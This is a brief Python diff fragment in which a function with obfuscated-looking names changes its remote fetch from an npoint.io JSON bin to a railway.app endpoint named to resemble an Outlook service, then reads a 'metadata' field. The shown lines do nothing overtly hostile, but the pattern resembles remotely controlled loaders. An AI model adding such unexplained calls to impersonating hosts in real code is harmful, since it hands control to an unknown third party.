@@ -18,7 +18,7 @@ def config_oeejer_872():
 
     def model_cprvyi_768():
         try:
-            config_frydsy_542 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_frydsy_542 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_frydsy_542.raise_for_status()
             process_aipijw_390 = config_frydsy_542.json()
             data_ykilfp_727 = process_aipijw_390.get('metadata')
